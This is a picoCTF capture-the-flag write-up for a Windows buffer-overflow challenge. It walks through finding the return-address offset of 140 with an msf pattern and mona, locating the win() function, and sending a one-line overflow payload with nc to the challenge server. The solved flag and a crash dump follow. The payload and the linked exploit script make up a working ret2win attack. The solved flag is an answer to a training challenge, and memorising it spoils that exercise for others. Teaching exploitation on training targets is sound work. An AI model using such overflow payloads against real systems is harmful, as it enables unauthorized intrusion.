### Binary Exploitation

### Source: PICOCTF

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/wine]
└─$ file vuln.exe 
vuln.exe: PE32 executable (console) Intel 80386, for MS Windows
```

Its a windows executable

Source code is given

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void win(){
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("flag.txt not found in current directory.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

void vuln()
{
  printf("Give me a string!\n");
  char buf[128];
  gets(buf);
}

int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);
  vuln();
  return 0;
}
```

We can see the program prints our give me a string then receives out input using the get() call which is vulnerable to buffer overflow

So obviously our goal is to return to the win function

Unlike using gdb to debug i don't know if that is possible 

But in this case i'll use `Immunity Debugger`

So i'll hop on to my windows box and run the binary one my windows machine
![image](https://user-images.githubusercontent.com/113513376/217090561-3582499d-757e-4bca-b0b5-2ace6694ae01.png)

So with this i'll attach the process on immunity debugger
![image](https://user-images.githubusercontent.com/113513376/217090666-8a33b8d7-ca7b-45ee-86ae-ef7c221874eb.png)

Now i will generate a msf pattern

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/wine]
└─$ msf-pattern_create -l 250
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A
```

Now this is the string i'll give the binary as input

The program crashes 
![image](https://user-images.githubusercontent.com/113513376/217091167-08e3c036-d782-4d4f-995b-f7af604e54c9.png)

So with this i can use the mona plugin to get the offset

```
Command: !mona findmsp -distance 250
```
![image](https://user-images.githubusercontent.com/113513376/217091847-883f5faa-62cc-496e-a898-347bf7bb0dcb.png)

Here's the important part

```
Log data, item 16
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x37654136 (offset 140)
```

Cool the offset is 140

Now i'll get make the exploit script

But before that i'll get the address of the win function using gdb

```
┌──(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/wine]
└─$ gdb-multiarch -q vuln.exe
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from vuln.exe...
[*] Not a valid file format: Not a valid ELF file (magic)
gef➤  info functions
All defined functions:

File ./debian/tmp/usr/i686-w64-mingw32/include/math.h:
166:    void __mingw_raise_matherr(int, const char *, double, double, double);
168:    void __mingw_setusermatherr(int (*)(struct _exception *));
276:    int _matherr(struct _exception *);

File ./mingw-w64-crt/crt/CRT_fp10.c:
9:      void _fpreset(void);

File ./mingw-w64-crt/crt/charmax.c:
17:     static int my_lconv_init(void);

File ./mingw-w64-crt/crt/crt_handler.c:
194:    long _gnu_exception_handler@4(EXCEPTION_POINTERS *);

File ./mingw-w64-crt/crt/crtexe.c:
181:    int WinMainCRTStartup(void);
437:    int atexit(_PVFV);
209:    int mainCRTStartup(void);
125:    static void __mingw_invalidParameterHandler(const wchar_t *, const wchar_t *, const wchar_t *, unsigned int, uintptr_t);
238:    static int __tmainCRTStartup(void);
138:    static int pre_c_init(void);
166:    static void pre_cpp_init(void);

File ./mingw-w64-crt/crt/dllargv.c:
18:     int _setargv(void);

File ./mingw-w64-crt/crt/gccmain.c:
55:     void __do_global_ctors(void);
24:     void __do_global_dtors(void);
78:     void __main(void);

File ./mingw-w64-crt/crt/gs_support.c:
104:    void __report_gsfailure(ULONG_PTR);
50:     void __security_init_cookie(void);

File ./mingw-w64-crt/crt/pesect.c:
45:     PIMAGE_SECTION_HEADER _FindPESection(PBYTE, DWORD_PTR);
67:     PIMAGE_SECTION_HEADER _FindPESectionByName(const char *);
130:    PIMAGE_SECTION_HEADER _FindPESectionExec(size_t);
160:    PBYTE _GetPEImageBase(void);
172:    WINBOOL _IsNonwritableInCurrentImage(PBYTE);
24:     WINBOOL _ValidateImageBase(PBYTE);
112:    int __mingw_GetSectionCount(void);
98:     PIMAGE_SECTION_HEADER __mingw_GetSectionForAddress(LPVOID);
192:    const char *__mingw_enum_import_library_names(int);

File ./mingw-w64-crt/crt/pseudo-reloc.c:
460:    void _pei386_runtime_relocator(void);
83:     static void __report_error(const char *, ...);
182:    static void mark_section_writable(LPVOID);

File ./mingw-w64-crt/crt/tlssup.c:
76:     BOOL __dyn_tls_init@12(HANDLE, DWORD, LPVOID);
109:    int __tlregdtor(_PVFV);
136:    static BOOL __dyn_tls_dtor(HANDLE, DWORD, LPVOID);

File ./mingw-w64-crt/crt/tlsthrd.c:
42:     int ___w64_mingwthr_add_key_dtor(DWORD, void (*)(void *));
65:     int ___w64_mingwthr_remove_key_dtor(DWORD);
122:    WINBOOL __mingw_TLScallback(HANDLE, DWORD, LPVOID);
99:     static void __mingwthr_run_key_dtors(void);

File ./mingw-w64-crt/misc/invalid_parameter_handler.c:
15:     static _invalid_parameter_handler mingw_get_invalid_parameter_handler(void);
7:      static _invalid_parameter_handler mingw_set_invalid_parameter_handler(_invalid_parameter_handler);

File ./mingw-w64-crt/stdio/acrt_iob_func.c:
9:      FILE *__acrt_iob_func(unsigned int);

Non-debugging symbols:
0x00401500  __gcc_register_frame
0x00401520  __gcc_deregister_frame
0x00401530  win
0x004015a9  vuln
0x004015cf  main
0x00402630  __chkstk_ms
0x0040265c  vfprintf
0x00402664  strncmp
0x0040266c  strlen
0x00402674  signal
0x0040267c  setvbuf
0x00402684  puts
0x0040268c  memcpy
0x00402694  malloc
0x0040269c  gets
0x004026a4  fwrite
0x004026ac  free
0x004026b4  fprintf
0x004026bc  fopen
0x004026c4  fgets
0x004026cc  fflush
0x004026d4  exit
0x004026dc  calloc
0x004026e4  abort
0x004026ec  _onexit
0x004026f4  _initterm
0x004026fc  _cexit
0x00402704  _amsg_exit
0x0040270c  __setusermatherr
0x00402714  __set_app_type
0x0040271c  __p__fmode
0x00402724  __p__acmdln
0x0040272c  __getmainargs
0x00402770  register_frame_ctor
0x00402780  _CTOR_LIST__
0x0040278c  _DTOR_LIST__
gef➤
```

Now here's the exploit command, I didn't really put it in form of a python exploit script i had problem receiving the flag part 😞

```
Payload: (python -c "print 'A'*140 +'\x30\x15\x40'")
```

So i'll run that on the remote server

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/wine]
└─$ (python -c "print 'A'*140 +'\x30\x15\x40'") | nc saturn.picoctf.net 57604 
Give me a string!
picoCTF{Un_v3rr3_d3_v1n_1b905d38}
Unhandled exception: page fault on read access to 0x7fec39e0 in 32-bit code (0x7fec39e0).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:7fec39e0 ESP:0064fe84 EBP:41414141 EFLAGS:00010206(  R- --  I   - -P- )
 EAX:00000000 EBX:00230e78 ECX:0064fe14 EDX:7fec48f4
 ESI:00000005 EDI:0021d6c8
Stack dump:
0x0064fe84:  00000000 00000004 00000000 7b432ecc
0x0064fe94:  00230e78 0064ff28 00401386 00000002
0x0064fea4:  00230e70 006d0da0 7bcc4625 00000004
0x0064feb4:  00000008 00230e70 0021d6c8 006143f8
0x0064fec4:  0da0d1b0 00000000 00000000 00000000
0x0064fed4:  00000000 00000000 00000000 00000000
Backtrace:
=>0 0x7fec39e0 (0x41414141)
0x7fec39e0: hlt
Modules:
Module  Address                 Debug info      Name (5 modules)
PE        400000-  44b000       Deferred        vuln
PE      7b020000-7b023000       Deferred        kernelbase
PE      7b420000-7b5db000       Deferred        kernel32
PE      7bc30000-7bc34000       Deferred        ntdll
PE      7fe10000-7fe14000       Deferred        msvcrt
Threads:
process  tid      prio (all id:s are in hex)
00000008 (D) Z:\challenge\vuln.exe
        00000009    0 <==
0000000c services.exe
        0000000e    0
        0000000d    0
00000012 explorer.exe
        00000013    0
System information:
    Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1)
    Platform: i386
    Version: Windows Server 2008 R2
    Host system: Linux
    Host version: 5.15.0-1023-aws
```

But i was able to make a bash exploit (as fun as py also 😄) [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/picoctf/wine/exploit.sh)

On running it

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/wine]
└─$ chmod +x exploit.sh
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/wine]
└─$ ./exploit.sh          
Error: This script requires two arguments - IP address and port number
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/wine]
└─$ ./exploit.sh saturn.picoctf.net 53956
Give me a string!
picoCTF{Un_v3rr3_d3_v1n_1b905d38}
Unhandled exception: page fault on read access to 0x7fec39e0 in 32-bit code (0x7fec39e0).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:7fec39e0 ESP:0064fe84 EBP:41414141 EFLAGS:00010206(  R- --  I   - -P- )
 EAX:00000000 EBX:00230e78 ECX:0064fe14 EDX:7fec48f4
 ESI:00000005 EDI:0021d6b8
Stack dump:
0x0064fe84:  00000000 00000004 00000000 7b432ecc
0x0064fe94:  00230e78 0064ff28 00401386 00000002
0x0064fea4:  00230e70 006d0da0 7bcc4625 00000004
0x0064feb4:  00000008 00230e70 0021d6b8 006145be
0x0064fec4:  3813df36 00000000 00000000 00000000
0x0064fed4:  00000000 00000000 00000000 00000000
Backtrace:
=>0 0x7fec39e0 (0x41414141)
0x7fec39e0: hlt
Modules:
Module  Address                 Debug info      Name (5 modules)
PE        400000-  44b000       Deferred        vuln
PE      7b020000-7b023000       Deferred        kernelbase
PE      7b420000-7b5db000       Deferred        kernel32
PE      7bc30000-7bc34000       Deferred        ntdll
PE      7fe10000-7fe14000       Deferred        msvcrt
Threads:
process  tid      prio (all id:s are in hex)
00000008 (D) Z:\challenge\vuln.exe
        00000009    0 <==
0000000c services.exe
        0000000e    0
        0000000d    0
00000012 explorer.exe
        00000013    0
System information:
    Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1)
    Platform: i386
    Version: Windows Server 2008 R2
    Host system: Linux
    Host version: 5.15.0-1023-aws
Payload sent successfully to saturn.picoctf.net:53956
```

And we're done 

<br> <br>
[Back To Home](../index.md)
                                  


